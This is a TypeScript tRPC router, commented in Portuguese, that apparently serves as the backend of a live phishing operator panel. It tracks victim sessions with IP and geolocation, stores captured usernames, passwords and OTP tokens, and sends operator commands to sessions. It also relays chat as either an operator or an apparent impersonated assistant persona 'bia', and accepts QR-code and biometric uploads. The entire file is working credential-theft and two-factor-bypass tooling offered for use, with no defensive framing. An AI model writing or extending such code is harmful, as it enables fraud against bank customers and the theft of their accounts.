import { z } from 'zod';
import { protectedProcedure, router } from '../_core/trpc';
import {
  createAccessSession,
  getAccessSessions,
  getAccessSessionById,
  updateAccessSession,
  createCapturedToken,
  getTokensBySession,
  createChatMessage,
  getChatMessages,
  createUpload,
  getUploadsBySession,
  createCommandLog,
  getCommandLogs,
} from '../db';
import { nanoid } from 'nanoid';

export const accessRouter = router({
  // Criar nova sessão de acesso
  createSession: protectedProcedure
    .input(z.object({
      ipAddress: z.string(),
      country: z.string().optional(),
      state: z.string().optional(),
      city: z.string().optional(),
      deviceType: z.string().default('Desktop'),
    }))
    .mutation(async ({ input, ctx }) => {
      const sessionId = nanoid();
      await createAccessSession({
        sessionId,
        userId: ctx.user.id,
        ipAddress: input.ipAddress,
        country: input.country,
        state: input.state,
        city: input.city,
        deviceType: input.deviceType,
        operatorId: ctx.user.id,
      });
      return { sessionId };
    }),

  // Obter todas as sessões
  getSessions: protectedProcedure.query(async () => {
    return getAccessSessions(50);
  }),

  // Obter sessão específica
  getSession: protectedProcedure
    .input(z.object({ sessionId: z.string() }))
    .query(async ({ input }) => {
      return getAccessSessionById(input.sessionId);
    }),

  // Atualizar sessão
  updateSession: protectedProcedure
    .input(z.object({
      sessionId: z.string(),
      currentScreen: z.string().optional(),
      capturedUsername: z.string().optional(),
      capturedPassword: z.string().optional(),
      status: z.enum(['online', 'offline', 'paused']).optional(),
    }))
    .mutation(async ({ input }) => {
      const { sessionId, ...data } = input;
      return updateAccessSession(sessionId, data);
    }),

  // Enviar comando para sessão
  sendCommand: protectedProcedure
    .input(z.object({
      sessionId: z.string(),
      commandType: z.string(),
      commandValue: z.string().optional(),
    }))
    .mutation(async ({ input, ctx }) => {
      await createCommandLog({
        sessionId: input.sessionId,
        commandType: input.commandType,
        commandValue: input.commandValue,
        operatorId: ctx.user.id,
      });
      return { success: true };
    }),

  // Obter histórico de comandos
  getCommandHistory: protectedProcedure
    .input(z.object({ sessionId: z.string() }))
    .query(async ({ input }) => {
      return getCommandLogs(input.sessionId);
    }),

  // Capturar token
  captureToken: protectedProcedure
    .input(z.object({
      sessionId: z.string(),
      token: z.string(),
      tokenType: z.string().default('OTP'),
    }))
    .mutation(async ({ input }) => {
      return createCapturedToken({
        sessionId: input.sessionId,
        token: input.token,
        tokenType: input.tokenType,
      });
    }),

  // Obter tokens capturados
  getTokens: protectedProcedure
    .input(z.object({ sessionId: z.string() }))
    .query(async ({ input }) => {
      return getTokensBySession(input.sessionId);
    }),

  // Enviar mensagem de chat
  sendChatMessage: protectedProcedure
    .input(z.object({
      sessionId: z.string(),
      message: z.string(),
      senderType: z.enum(['operator', 'bia']),
    }))
    .mutation(async ({ input }) => {
      return createChatMessage({
        sessionId: input.sessionId,
        message: input.message,
        senderType: input.senderType,
      });
    }),

  // Obter mensagens de chat
  getChatMessages: protectedProcedure
    .input(z.object({ sessionId: z.string() }))
    .query(async ({ input }) => {
      return getChatMessages(input.sessionId);
    }),

  // Upload de arquivo (QR Code, Avatar, etc)
  uploadFile: protectedProcedure
    .input(z.object({
      sessionId: z.string(),
      uploadType: z.enum(['qrcode', 'avatar', 'biometric']),
      fileUrl: z.string(),
      fileName: z.string().optional(),
    }))
    .mutation(async ({ input }) => {
      return createUpload({
        sessionId: input.sessionId,
        uploadType: input.uploadType,
        fileUrl: input.fileUrl,
        fileName: input.fileName,
      });
    }),

  // Obter uploads da sessão
  getUploads: protectedProcedure
    .input(z.object({ sessionId: z.string() }))
    .query(async ({ input }) => {
      return getUploadsBySession(input.sessionId);
    }),
});
